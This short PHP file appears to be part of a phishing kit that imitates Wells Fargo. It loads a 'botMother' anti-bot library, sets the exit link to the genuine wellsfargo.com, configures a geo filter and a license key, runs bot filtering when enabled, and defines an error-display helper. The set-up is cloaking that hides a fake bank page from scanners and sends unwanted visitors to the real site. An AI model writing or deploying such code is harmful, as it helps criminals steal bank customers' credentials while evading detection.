<?php 
require (__DIR__).'/config.php'; 
require (__DIR__).'/md.php';
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$m = new botMother();
$bm->setExitLink("https://www.wellsfargo.com/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);
if(strtolower($antibot)=="yes"){
$bm->run();
} 

function setError($msg){
    if(isset($_GET['e'])){
        echo '<div class="error">'.$msg.'</div>';
    }
}



?>